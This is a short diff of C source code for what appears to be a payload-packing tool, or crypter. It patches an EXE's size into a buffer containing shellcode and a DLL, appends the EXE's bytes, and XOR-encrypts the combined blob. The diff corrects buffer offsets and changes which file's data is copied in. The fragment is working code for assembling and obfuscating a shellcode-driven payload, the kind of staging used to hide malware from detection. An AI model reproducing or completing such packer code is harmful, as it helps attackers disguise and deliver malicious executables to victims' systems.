@@ -5703,17 +5703,18 @@ int main(int argc, char* argv[])
 
 	printf("size of file:  %d bytes\n", dwFileSizeLow);
 	printf("Current value of EXE size in DLL:  \n");
-	hexDump(NULL, (char*)&encrypted[0xc8a4], 4);
+	hexDump(NULL, (char*)&encrypted[0x1800 + 0xc8a4], 4);
 
 	printf("Patching EXE size in DLL via char...\n");
 	memcpy(encrypted + 0x1800 + 0xc8a4, (char*)&dwFileSizeLow, 4);
 	hexDump(NULL, (char*)&encrypted[0x1800 + 0xc8a4], 4);
 
 	printf("Paching it DWORD way...\n");
-	*(DWORD*)&encrypted[0xc8a4] = dwFileSizeLow;
+	*(DWORD*)&encrypted[0x1800 + 0xc8a4] = dwFileSizeLow;
 	hexDump(NULL, (char*)&encrypted[0x1800 + 0xc8a4], 4);
 
-	memcpy(encrypted + 0x1800 + 0xc8a4 + 4, pDllBuffer, dwFileSizeLow);
+	//copy EXE data to the location after the shellcode, DLL, 4 byte DWORD value of the size of the EXE
+	memcpy(encrypted + 0x1800 + 0xc8a4 + 4, pExeBuffer, dwFileSizeLow);
 
 	//Now encrypt the whole  thing
 	xor_payload(XorKey, encrypted, totalSizeOfBuffer);
